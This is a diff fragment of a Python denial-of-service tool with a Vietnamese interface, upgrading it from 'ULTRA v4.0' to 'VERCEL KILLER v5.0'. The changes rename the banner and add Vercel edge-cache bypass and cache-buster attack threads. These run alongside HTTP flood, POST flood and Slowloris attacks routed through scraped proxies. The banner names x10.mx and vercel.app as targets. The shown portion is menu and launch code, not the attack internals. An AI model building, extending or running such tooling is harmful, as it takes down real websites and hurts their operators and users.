-    ║  ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██║  ██║██║  ██║██║   ██║╚════██║ ║
-    ║  ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██████╔╝██████╔╝╚██████╔╝███████║ ║
-    ║   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║
-    ║                                                                              ║
-    ║  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗  ██╗   ██╗██╗   ██╗            ║
-    ║  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝  ██║   ██║╚██╗ ██╔╝            ║
-    ║  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝   ██║   ██║ ╚████╔╝             ║
-    ║  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝    ██║   ██║  ╚██╔╝              ║
-    ║  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║     ╚██████╔╝   ██║               ║
-    ║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═════╝    ╚═╝               ║
-    ╠══════════════════════════════════════════════════════════════════════════════╣
-    ║  PHIÊN BẢN: 4.0 ULTRA | ĐA METHOD | ĐA MỤC TIÊU | SIÊU MẠNH                ║
-    ║  {len(HTTP_METHODS)} Methods | {len(CONTENT_TYPES)} Content-Types | {len(TARGET_URLS)} Mục tiêu    ║
-    ╚══════════════════════════════════════════════════════════════════════════════╝
+    banner = f"""
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║  ██╗   ██╗███████╗██████╗  ██████╗███████╗██╗     ██╗  ██╗██╗██╗     ║
+    ║  ██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██║     ██║ ██╔╝██║██║     ║
+    ║  ██║   ██║█████╗  ██████╔╝██║     █████╗  ██║     █████╔╝ ██║██║     ║
+    ║  ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║     ██╔══╝  ██║     ██╔═██╗ ██║██║     ║
+    ║   ╚████╔╝ ███████╗██║  ██║╚██████╗███████╗███████╗██║  ██╗██║███████╗║
+    ║    ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝║
+    ║                                                                      ║
+    ║  ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗     ██╗   ██╗ ██████╗    ║
+    ║  ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗    ██║   ██║██╔════╝    ║
+    ║  █████╔╝ ██║██║     ██║     █████╗  ██████╔╝    ██║   ██║███████╗    ║
+    ║  ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══██╗   ║
+    ║  ██║  ██╗██║███████╗███████╗███████╗██║  ██║     ╚████╔╝ ╚██████╔╝   ║
+    ║  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝    ║
+    ╠══════════════════════════════════════════════════════════════════════╣
+    ║  PHIÊN BẢN: 5.0 VERCEL KILLER | {len(HTTP_METHODS)} Methods | {len(TARGET_URLS)} Mục tiêu    ║
+    ║  TỔNG LUỒNG: {TOTAL_THREADS} | PROXY LIVE: tối đa                          ║
+    ║  HỖ TRỢ: x10.mx + VERCEL.APP (BYPASS EDGE CACHE)                      ║
+    ╚══════════════════════════════════════════════════════════════════════════╝
     """
     print(banner)
 
@@ -804,22 +899,26 @@ def main_menu():
     http_flood = None
     post_flood = None
     slowloris = None
+    vercel_bypass = None
+    cache_buster = None
     
     while True:
         print("\n" + "="*60)
-        print("                    MENU CHÍNH - ULTRA v4.0")
+        print("              MENU CHÍNH - VERCEL KILLER v5.0")
         print("="*60)
         print("[1] Quét proxy từ các nguồn online")
         print("[2] Kiểm tra proxy live từ file proxies_raw.txt")
         print("[3] Quét + Kiểm tra proxy (tự động hoàn toàn)")
         print("[4] Xem danh sách proxy live hiện tại")
-        print("[5] BẮT ĐẦU SIÊU TẤN CÔNG (TẤT CẢ METHOD)")
+        print("[5] BẮT ĐẦU SIÊU TẤN CÔNG (TẤT CẢ METHOD + VERCEL BYPASS)")
         print("[6] DỪNG TẤT CẢ CUỘC TẤN CÔNG")
         print("[7] Thoát")
         print("="*60)
-        print(f"[*] MỤC TIÊU: {len(TARGET_URLS)} URL trên {TARGET_HOST}")
-        print(f"[*] TỔNG LUỒNG: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS}")
-        print("[*] MẸO: Nhấn Ctrl+C bất cứ lúc nào để lưu proxy live và thoát an toàn")
+        print(f"[*] MỤC TIÊU: {TARGET_HOST_1} + {TARGET_HOST_2}")
+        print(f"[*] TỔNG URL: {len(TARGET_URLS)} | PATHS: {len(TARGET_PATHS)}")
+        print(f"[*] TỔNG LUỒNG: {TOTAL_THREADS} | METHODS: {len(HTTP_METHODS)}")
+        print(f"[*] VERCEL BYPASS: {VERCEL_BYPASS_THREADS} luồng | CACHE BUSTER: {CACHE_BYPASS_THREADS} luồng")
+        print("[*] MẸO: Nhấn Ctrl+C để lưu proxy và thoát an toàn")
         print("="*60)
         
         choice = input("\n[?] Chọn chức năng (1-7): ").strip()
@@ -850,12 +949,12 @@ def main_menu():
                 print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                 continue
             print(f"\n[+] SẴN SÀNG SIÊU TẤN CÔNG VỚI {len(live_proxies)} PROXY LIVE")
-            print(f"[+] MỤC TIÊU: {', '.join(TARGET_URLS)}")
-            print(f"[+] TỔNG LUỒNG: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS}")
-            print(f"[+] HTTP Methods: {len(HTTP_METHODS)} | Content-Types: {len(CONTENT_TYPES)} | Payloads: {len(PAYLOADS)}")
+            print(f"[+] MỤC TIÊU: {TARGET_HOST_1} + {TARGET_HOST_2}")
+            print(f"[+] TỔNG LUỒNG: {TOTAL_THREADS}")
+            print(f"[+] VERCEL BYPASS: CÓ ({VERCEL_BYPASS_THREADS} luồng)")
+            print(f"[+] CACHE BUSTER: CÓ ({CACHE_BYPASS_THREADS} luồng)")
             confirm = input("\n[?] Bắt đầu siêu tấn công? (y/n): ").strip().lower()
             if confirm == "y":
-                # Khởi động tất cả các loại tấn công
                 http_flood = HTTPFlood(proxy_manager)
                 http_flood.start_flood(HTTP_FLOOD_THREADS)
                 
@@ -865,30 +964,32 @@ def main_menu():
                 ultra_attack = UltraDDoSAttack(proxy_manager)
                 ultra_attack.start_mega_attack(RANDOM_METHOD_THREADS)
                 
+                vercel_bypass = VercelBypass(proxy_manager)
+                vercel_bypass.start_attack(VERCEL_BYPASS_THREADS)
+                
+                cache_buster = CacheBuster(proxy_manager)
+                cache_buster.start_attack(CACHE_BYPASS_THREADS)
+                
                 slowloris = Slowloris()
                 slowloris.start_attack(SLOWLORIS_THREADS)
                 
-                print("\n[!] ĐANG SIÊU TẤN CÔNG VỚI TẤT CẢ METHOD... Nhấn Enter để dừng")
+                print("\n[!] ĐANG SIÊU TẤN CÔNG VỚI TẤT CẢ METHOD + VERCEL BYPASS... Nhấn Enter để dừng")
                 input()
                 
-                if http_flood:
-                    http_flood.stop_flood()
-                if post_flood:
-                    post_flood.stop_flood()
-                if ultra_attack:
-                    ultra_attack.stop_attack()
-                if slowloris:
-                    slowloris.stop_attack()
+                if http_flood: http_flood.stop_flood()
+                if post_flood: post_flood.stop_flood()
+                if ultra_attack: ultra_attack.stop_attack()
+                if vercel_bypass: vercel_bypass.stop_attack()
+                if cache_buster: cache_buster.stop_attack()
+                if slowloris: slowloris.stop_attack()
                 print("\n[!] Đã dừng tất cả cuộc tấn công")
         elif choice == "6":
-            if http_flood:
-                http_flood.stop_flood()
-            if post_flood:
-                post_flood.stop_flood()
-            if ultra_attack:
-                ultra_attack.stop_attack()
-            if slowloris:
-                slowloris.stop_attack()
+            if http_flood: http_flood.stop_flood()
+            if post_flood: post_flood.stop_flood()
+            if ultra_attack: ultra_attack.stop_attack()
+            if vercel_bypass: vercel_bypass.stop_attack()
+            if cache_buster: cache_buster.stop_attack()
+            if slowloris: slowloris.stop_attack()
             print("[!] Đã dừng tất cả cuộc tấn công")
         elif choice == "7":
             if proxy_manager and proxy_manager.live_proxies:
